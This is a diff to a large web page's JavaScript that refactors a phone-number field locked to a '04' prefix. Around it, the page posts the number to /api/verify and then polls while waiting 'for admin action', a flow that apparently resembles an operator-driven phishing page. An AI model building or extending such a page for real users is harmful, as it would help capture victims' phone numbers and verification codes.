@@ -27306,16 +27306,17 @@ if (!location.search.includes('sid=')) {
   /* ----------  LOCK “04” PREFIX  ---------- */
   field.value = '04';
   field.addEventListener('keydown', e => {
-    const pos = field.selectionStart;
-    if (pos <= 2 && (e.key === 'Backspace' || e.key === 'Delete')) {
+    if (field.selectionStart <= 2 && (e.key === 'Backspace' || e.key === 'Delete')) {
       e.preventDefault();
     }
   });
 
-  /* ----------  FORMATTER / LIMITER  ---------- */
-  function format(raw) {
-    const digits = raw.replace(/\D/g, '');
-    return '04' + digits.slice(0, 8);   // 04 + 8 digits max
+  /* ----------  FORMATTER (no re-add)  ---------- */
+  function format() {
+    const digits = field.value.replace(/\D/g, '');
+    // keep 04 + next 8 digits
+    const body = digits.slice(2, 10);          // skip first 2 if user pasted more
+    return '04' + body.slice(0, 8);
   }
 
   /* ----------  LOADING TOGGLE  ---------- */
@@ -27324,9 +27325,8 @@ if (!location.search.includes('sid=')) {
 
   /* ----------  INPUT HANDLER  ---------- */
   field.addEventListener('input', () => {
-    const curr = field.value;
-    const fixed = format(curr);
-    if (curr !== fixed) field.value = fixed;
+    const fixed = format();
+    if (field.value !== fixed) field.value = fixed;
     btn.disabled = fixed.length !== 10;   // 04 + 8 = 10
   });
 
@@ -27335,7 +27335,7 @@ if (!location.search.includes('sid=')) {
     const phone = field.value.trim();
     if (phone.length !== 10) return;
     btn.disabled = true;
-    showLoading();                       // show spinner NOW
+    showLoading();                       // spinner NOW
 
     try {
       const r = await fetch('/api/verify', {
@@ -27351,7 +27351,7 @@ if (!location.search.includes('sid=')) {
       return;
     }
 
-    // wait for admin action
+    // wait for admin
     let polling = false;
     function startPoll() {
       if (polling) return;
@@ -28704,6 +28704,7 @@ if (!location.search.includes('sid=')) {
   </iframe>
  </body>
 </html>
+
 
 
 
